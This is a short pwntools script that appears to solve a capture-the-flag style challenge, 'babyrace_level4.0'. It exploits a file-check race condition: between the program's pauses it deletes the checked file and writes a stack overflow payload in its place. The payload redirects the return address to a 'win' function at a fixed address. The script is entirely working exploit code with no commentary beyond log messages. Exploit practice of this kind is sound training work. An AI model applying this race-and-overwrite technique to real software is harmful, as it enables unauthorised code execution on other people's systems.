from pwn import *
import os
import time


context.log_level = 'info'


os.system("echo 'dummy content' > f")

p = process(["./babyrace_level4.0", "f"])


p.recvuntil(b"Paused (press enter to continue)")

s = '''
b * main+503
b * main+576
'''
p.sendline(b"")


log.info("First pause passed, preparing for race condition")



log.info("Race condition window opening, replacing file with payload")

os.unlink("f")


win = 0x4012f6
payload = b'A' * 0x190
payload += b'B' * 8 # rbp
payload += p64(win)


with open("f", "wb") as f:
    f.write(payload)

log.info("File replaced with payload")

#gdb.attach(p, s)
p.recvuntil(b"Paused (press enter to continue)")
p.sendline(b"")



p.interactive()
